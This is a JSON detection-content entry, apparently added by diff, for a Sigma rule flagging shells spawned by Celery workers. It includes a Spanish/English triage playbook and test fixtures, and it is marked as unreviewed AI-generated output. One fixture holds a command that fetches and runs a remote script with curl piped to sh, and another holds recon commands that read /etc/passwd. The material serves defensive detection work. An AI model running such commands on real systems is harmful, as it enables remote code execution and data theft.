@@ -1,0 +1,140 @@
+{
+  "rule": {
+    "id": "904f6442-3b57-4b3f-987c-1559f58ce8d8",
+    "title": "Shell Spawned by Celery Worker Process",
+    "level": "medium",
+    "status": "experimental",
+    "author": "Jennifer Batina",
+    "path": "linux/process_creation/proc_creation_lnx_celery_worker_shell_spawn.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_celery_worker_shell_spawn.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso worker de Celery (Python) lanzó directamente un intérprete de shell. Puede indicar inyección de comandos o de prompt contra una tarea, por ejemplo de un agente LLM, que terminó ejecutando comandos del sistema.",
+      "what_it_detects": "Eventos process_creation en Linux donde Image termina en un shell conocido (sh, bash, dash, zsh, busybox, etc.), ParentImage es un binario python/python3/python3.x y ParentCommandLine contiene 'celery'.",
+      "why_it_matters": "Las tareas de Celery suelen procesar datos externos. Si una tarea pasa esa entrada a un shell (os.system, subprocess con shell=True), un atacante puede ejecutar comandos arbitrarios con la cuenta del worker (ATT&CK T1059.004, Unix Shell).",
+      "triage_steps": [
+        "Revise CommandLine del shell: busque descargas (curl, wget), reverse shells, base64, redirecciones a /dev/tcp o comandos de reconocimiento (id, whoami, uname).",
+        "Confirme en ParentCommandLine qué aplicación Celery (-A módulo) y qué cola o worker generó el proceso; identifique al equipo responsable.",
+        "Busque procesos hijos del shell y conexiones de red salientes desde el host en una ventana de +/- 15 minutos.",
+        "Correlacione con los logs del worker y del broker (Redis/RabbitMQ): qué tarea se ejecutó, sus argumentos y quién la encoló.",
+        "Si la tarea procesa prompts o salidas de un LLM, revise el texto de entrada en busca de instrucciones inyectadas.",
+        "Compare con la línea base: ¿este worker lanza shells con la misma CommandLine habitualmente? Revise alertas previas del host y del usuario del servicio.",
+        "Verifique cambios de archivos recientes en el host: crontab, ~/.ssh/authorized_keys, /tmp y binarios nuevos."
+      ],
+      "false_positives": [
+        "Tareas administrativas heredadas o personalizadas que usan shell=True u os.system de forma deliberada.",
+        "Pipelines de medios, despliegue o reportes que invocan herramientas externas (ffmpeg, git) a través de un shell.",
+        "Scripts de mantenimiento ejecutados como tareas programadas con Celery beat que llaman a comandos del sistema."
+      ],
+      "response_steps": [
+        "Valide con el dueño de la aplicación si el comando observado corresponde a una tarea legítima y documentada.",
+        "Si es malicioso, aísle el host o detenga el worker afectado y pause la cola implicada, preservando logs y memoria si es posible.",
+        "Rote las credenciales accesibles por el worker (variables de entorno, tokens de API, acceso al broker y bases de datos).",
+        "Elimine persistencia o artefactos encontrados y corrija el código de la tarea para evitar shell=True y validar la entrada.",
+        "Restablezca el servicio desde una imagen confiable y añada exclusiones específicas solo para comandos legítimos verificados."
+      ],
+      "severity_rationale": "Es medium porque algunas tareas lanzan shells de forma legítima, pero en un worker que procesa entrada externa puede tratarse de ejecución remota de código."
+    },
+    "en": {
+      "summary": "A Celery worker process (Python) directly spawned a shell interpreter. This may mean command or prompt injection against a task, such as an LLM agent task, that ended up running system commands.",
+      "what_it_detects": "Linux process_creation events where Image ends with a known shell (sh, bash, dash, zsh, busybox, etc.), ParentImage is a python/python3/python3.x binary and ParentCommandLine contains 'celery'.",
+      "why_it_matters": "Celery tasks often handle external input. If a task passes that input to a shell (os.system, subprocess with shell=True), an attacker can run arbitrary commands as the worker account (ATT&CK T1059.004, Unix Shell).",
+      "triage_steps": [
+        "Review the shell's CommandLine: look for downloads (curl, wget), reverse shells, base64, /dev/tcp redirections or recon commands (id, whoami, uname).",
+        "Use ParentCommandLine to identify the Celery app (-A module), queue or worker that spawned it, and find the owning team.",
+        "Look for child processes of the shell and outbound network connections from the host within +/- 15 minutes.",
+        "Correlate with worker and broker logs (Redis/RabbitMQ): which task ran, its arguments and who enqueued it.",
+        "If the task processes prompts or LLM output, inspect the input text for injected instructions.",
+        "Compare with baseline: does this worker routinely spawn shells with the same CommandLine? Check earlier alerts for the host and service user.",
+        "Check recent file changes on the host: crontab, ~/.ssh/authorized_keys, /tmp and new binaries."
+      ],
+      "false_positives": [
+        "Legacy or custom administrative tasks deliberately using shell=True or os.system.",
+        "Media processing, deployment or reporting pipelines shelling out to external tools such as ffmpeg or git.",
+        "Maintenance jobs scheduled via Celery beat that call system commands."
+      ],
+      "response_steps": [
+        "Confirm with the application owner whether the observed command matches a legitimate, documented task.",
+        "If malicious, isolate the host or stop the affected worker and pause the queue, preserving logs and memory where possible.",
+        "Rotate credentials reachable by the worker: environment variables, API tokens, broker and database access.",
+        "Remove any persistence or artifacts found and fix the task code to avoid shell=True and validate input.",
+        "Restore the service from a trusted image and add narrow exclusions only for verified legitimate commands."
+      ],
+      "severity_rationale": "Medium fits because some tasks spawn shells legitimately, but on a worker handling external input this can be remote code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Celery worker running under a virtualenv python3 spawns /bin/sh that downloads and runs a script",
+        "event": {
+          "Image": "/bin/sh",
+          "CommandLine": "/bin/sh -c curl -s http://203.0.113.45/x.sh | sh",
+          "ParentImage": "/opt/agent/venv/bin/python3",
+          "ParentCommandLine": "/opt/agent/venv/bin/python3 /opt/agent/venv/bin/celery -A agent.tasks worker --loglevel=INFO -Q llm",
+          "User": "celery",
+          "ProcessId": 48213,
+          "ParentProcessId": 47790,
+          "CurrentDirectory": "/opt/agent",
+          "Computer": "llm-worker-02"
+        }
+      },
+      {
+        "description": "Celery worker on python3.11 spawns bash running recon commands",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -c id; uname -a; cat /etc/passwd",
+          "ParentImage": "/usr/local/bin/python3.11",
+          "ParentCommandLine": "/usr/local/bin/python3.11 -m celery -A reports worker -c 4",
+          "User": "svc-reports",
+          "ProcessId": 9921,
+          "ParentProcessId": 9800,
+          "CurrentDirectory": "/srv/reports",
+          "Computer": "app-03"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Celery worker invokes git directly without a shell (Image is not a shell)",
+        "event": {
+          "Image": "/usr/bin/git",
+          "CommandLine": "git -C /srv/deploy/repo pull --ff-only",
+          "ParentImage": "/usr/bin/python3",
+          "ParentCommandLine": "/usr/bin/python3 /usr/local/bin/celery -A deploy worker --loglevel=WARNING",
+          "User": "deploy",
+          "ProcessId": 30455,
+          "ParentProcessId": 30101,
+          "CurrentDirectory": "/srv/deploy",
+          "Computer": "app-01"
+        }
+      },
+      {
+        "description": "Gunicorn web app running on python3 spawns sh; parent command line does not reference celery",
+        "event": {
+          "Image": "/bin/sh",
+          "CommandLine": "/bin/sh -c /usr/bin/convert input.png output.jpg",
+          "ParentImage": "/usr/bin/python3",
+          "ParentCommandLine": "/usr/bin/python3 /usr/local/bin/gunicorn app:server --workers 3",
+          "User": "www-data",
+          "ProcessId": 15520,
+          "ParentProcessId": 15302,
+          "CurrentDirectory": "/srv/web",
+          "Computer": "web-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:11+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
